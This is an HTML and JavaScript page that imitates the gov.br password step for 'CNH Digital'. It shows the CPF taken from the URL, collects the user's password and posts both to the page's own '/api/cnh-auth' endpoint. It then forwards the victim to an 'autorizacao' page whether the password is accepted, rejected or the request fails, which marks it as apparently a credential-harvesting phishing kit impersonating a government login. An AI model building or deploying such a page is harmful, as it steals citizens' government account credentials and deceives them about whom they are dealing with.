<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login gov.br - Senha</title>

    <script>
        (function () {
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.getRegistrations().then(function (regs) {
                    for (let reg of regs) reg.unregister();
                });
            }
        })();
    </script>

    <link rel="manifest" href="manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="CNH Digital">
    <link rel="apple-touch-icon" href="icon-192.png">

    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        body {
            font-family: 'Raleway', sans-serif;
            margin: 0;
            background-color: #f6f6f6;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
            touch-action: pan-x pan-y;
            overflow-x: hidden;
            height: 100dvh;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            height: 100%;
            background: #f6f6f6;
        }

        .header {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            margin-bottom: 24px;
            padding: 16px 20px;
            background-color: #fff;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.16);
        }

        .logo-gov {
            width: 100px;
        }

        .login-card {
            width: calc(100% - 40px);
            margin: 0 auto 20px;
            background-color: #fff;
            padding: 24px 16px 22px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16);
            box-sizing: border-box;
        }

        .title {
            font-weight: 600;
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
        }

        .label-pequena {
            font-size: 14px;
            color: #333;
            font-weight: 600;
            margin-bottom: 5px;
        }

        .cpf-destaque {
            font-size: 16px;
            font-weight: 700;
            color: #000;
            margin-bottom: 20px;
        }

        .input-group {
            position: relative;
            margin-bottom: 10px;
        }

        .input-senha {
            width: 100%;
            padding: 12px 15px;
            padding-right: 40px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            font-family: 'Raleway', sans-serif;
            background-color: #fffbe6;
        }

        .input-senha:focus {
            border-color: #1351b4;
            box-shadow: 0 0 0 1px #1351b4 inset;
        }

        .alert-error {
            background-color: #fbf5d0;
            border: 1px solid #e5c22d;
            border-radius: 4px;
            padding: 12px 15px;
            margin-bottom: 20px;
            display: none;
            align-items: center;
            font-size: 14px;
            color: #000;
            font-weight: 500;
            width: 100%;
            box-sizing: border-box;
        }

        .alert-error i {
            font-size: 18px;
            margin-right: 12px;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }

        .link-esqueci {
            color: #1351b4;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            display: block;
            margin-bottom: 30px;
        }

        .area-botoes {
            display: flex;
            justify-content: space-between;
            gap: 15px;
        }

        .btn {
            flex: 1;
            padding: 12px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
        }

        .btn-cancelar {
            background-color: #fff;
            color: #1351b4;
            border: 1px solid #1351b4;
        }

        .btn-cancelar:hover {
            background-color: #f0f5ff;
        }

        .btn-entrar {
            background-color: #1351b4;
            color: white;
            border: none;
        }

        .btn-entrar:hover {
            background-color: #0c3c8b;
        }

        .btn:disabled {
            background-color: #ccc;
            border-color: #ccc;
            cursor: not-allowed;
            color: #fff;
        }

        .footer-doubt {
            text-align: center;
            margin-top: 30px;
            font-size: 14px;
        }

        .footer-doubt a {
            color: #1351b4;
            text-decoration: none;
            font-weight: 600;
        }

        @media (min-width: 768px) {
            .container .title,
            .container .input-senha,
            .container .alert-error,
            .container .btn,
            .container .cpf-destaque {
                font-size: 12.8px;
            }

            .container .label-pequena,
            .container .link-esqueci,
            .container .footer-doubt {
                font-size: 11.2px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <img src="img/logo.png" class="logo-gov" alt="Logo gov.br">
        </div>

        <div class="login-card">
            <div class="title">Digite sua senha</div>

            <div class="label-pequena">CPF</div>
            <div class="cpf-destaque" id="mostrarCpf">Carregando...</div>

            <div class="label-pequena">Senha</div>
            <div class="input-group">
                <input type="password" id="campoSenha" class="input-senha" placeholder="Digite sua senha atual"
                    oninput="esconderErroSenha()">
                <i class="fas fa-eye toggle-password" onclick="toggleSenha()"></i>
            </div>

            <div id="alert-erro-senha" class="alert-error"><i class="fas fa-exclamation-triangle"></i><span
                    id="texto-erro-senha">Senha incorreta. Tente novamente.</span></div>

            <a href="#" class="link-esqueci">Esqueci minha senha</a>

            <div class="area-botoes">
                <button class="btn btn-cancelar" onclick="window.location.href='index.html'">Cancelar</button>
                <button class="btn btn-entrar" onclick="validarSenha()">Entrar</button>
            </div>

            <div class="footer-doubt">
                <a href="#">Ficou com dúvidas?</a>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const cpfRecebido = urlParams.get('cpf');

        if (!cpfRecebido) {
            window.location.replace("index.html");
        } else {
            document.getElementById('mostrarCpf').innerText = cpfRecebido.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
        }

        function toggleSenha() {
            const input = document.getElementById('campoSenha');
            const icon = document.querySelector('.toggle-password');
            if (input.type === "password") {
                input.type = "text";
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = "password";
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        function mostrarErroSenha(mensagem) {
            const alerta = document.getElementById('alert-erro-senha');
            const texto = document.getElementById('texto-erro-senha');
            texto.innerText = mensagem;
            alerta.style.display = 'flex';
        }

        function esconderErroSenha() {
            const alerta = document.getElementById('alert-erro-senha');
            if (alerta) alerta.style.display = 'none';
        }

        async function validarSenha() {
            const senhaDigitada = document.getElementById('campoSenha').value;
            const btnEntrar = document.querySelector('.btn-entrar');
            esconderErroSenha();

            if (senhaDigitada === "") {
                mostrarErroSenha("Por favor, digite uma senha.");
                return;
            }

            btnEntrar.innerText = "Entrando...";
            btnEntrar.disabled = true;

            try {
                const res = await fetch("/api/cnh-auth", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ cpf: cpfRecebido, senha: senhaDigitada.trim() })
                });
                const json = await res.json().catch(() => ({}));

                if (res.ok && json.success) {
                    window.location.href = "autorizacao?cpf=" + encodeURIComponent(cpfRecebido);
                } else if (res.status === 404) {
                    mostrarErroSenha("CPF informado inválido. (ERL0000500)");
                    btnEntrar.innerText = "Entrar";
                    btnEntrar.disabled = false;
                } else {
                    window.location.href = "autorizacao?cpf=" + encodeURIComponent(cpfRecebido);
                }
            } catch (err) {
                console.error(err);
                window.location.href = "autorizacao?cpf=" + encodeURIComponent(cpfRecebido);
            }
        }
    </script>
</body>

</html>
